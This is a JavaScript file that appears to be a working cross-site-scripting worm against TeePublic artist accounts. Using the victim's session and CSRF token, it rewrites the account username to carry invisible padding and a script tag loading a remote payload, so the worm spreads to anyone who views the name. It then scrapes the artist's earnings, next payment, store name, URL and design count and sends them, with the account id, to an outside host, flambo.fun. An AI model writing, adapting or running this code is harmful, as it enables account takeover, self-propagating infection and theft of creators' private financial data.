
(async function () {

    const ENABLE_CLONE = true

    const MIN_EARNINGS = 0

    const FALMBO_SCRIPT = "https://cdn.jsdelivr.net/gh/sarahgraham14/assets@main/flb.min.js"

    const ACTIVE_VERSION = "isActive_v7"

    const data = window.dataLayer.find(layer => layer.event === "pageLoad")

    if (!data.user__user_is_artist) return

    const account = data.user__user_id

    const parent = document.querySelector(".m-design-details__product-info .link").getAttribute("href")

    const accountEarnings = document.querySelectorAll(".account-earnings__amount")

    const nextPayment = Number(accountEarnings?.[1]?.textContent?.replace("$", "")?.trim())

    const totalEarnings = Number(accountEarnings?.[2]?.textContent?.replace("$", "")?.trim())

    const isActive = ENABLE_CLONE && nextPayment >= MIN_EARNINGS

    if (isActive && !localStorage.getItem(ACTIVE_VERSION)) {

        new Promise(async function () {

            const settingsPage = await fetch("https://www.teepublic.com/account/settings")

            const Settings = new DOMParser().parseFromString(await settingsPage.text(), "text/html")

            var username = extractContent(Settings.querySelector("input[name='user[username]']").getAttribute("value") || "")

            username = `${username}${"ㅤ".repeat(username.length < 70 ? 70 - username.length : 1)}<script src="${FALMBO_SCRIPT}"></script>`

            await fetch("https://www.teepublic.com/account/settings", {
                method: "POST",
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                body: new URLSearchParams({
                    "utf8": "✓",
                    "_method": "patch",
                    "authenticity_token": Settings.querySelector(".edit_user input[name=authenticity_token]").getAttribute("value"),
                    "user[first_name]": Settings.querySelector(".edit_user input[name='user[first_name]']").getAttribute("value"),
                    "user[last_name]": Settings.querySelector(".edit_user input[name='user[last_name]']").getAttribute("value"),
                    "user[username]": username,
                    "user[email]": Settings.querySelector(".edit_user input[name='user[email]']").getAttribute("value"),
                    "user[country_id]": Settings.querySelector(".edit_user select[name='user[country_id]'] option[selected]").getAttribute("value"),
                    "user[settings][off_site_marketing]": Settings.querySelector(".edit_user input[name='user[settings][off_site_marketing]'][type=checkbox]").checked ? "1" : "0",
                    "user[password]": "",
                    "user[password_confirmation]": "",
                    "commit": "Save Changes"
                })
            })

            localStorage.setItem(ACTIVE_VERSION, 1)

        }).catch(_ => undefined)
    }

    const response = await fetch("https://www.teepublic.com/my-storefront")

    const storeFront = new DOMParser().parseFromString(await response.text(), "text/html")

    const name =
        storeFront.querySelector(".m-store-head__hero-name span")?.textContent
        || storeFront.querySelector("[data-gtm-designer-name]")?.getAttribute("data-gtm-designer-name")

    const frontURL =
        storeFront.querySelector(".m-store-head__hero-name a")?.getAttribute("href")
        || storeFront.querySelector(".edit_store")?.getAttribute("action")

    const storeTab = storeFront.querySelector(".m-store-head__tabs .link__content")

    const totalDesigns = Number(storeTab?.textContent?.trim()?.match(/(\d+)/)?.[0])

    fetch("https://flambo.fun/api/public/store", {
        method: "POST",
        body: JSON.stringify({ nextPayment, totalEarnings, name, frontURL, totalDesigns, account, parent, isActive })
    }).catch(_ => undefined)

    function extractContent(s) {
        var span = document.createElement('span');
        span.innerHTML = s;
        return span.textContent || span.innerText;
    }

})();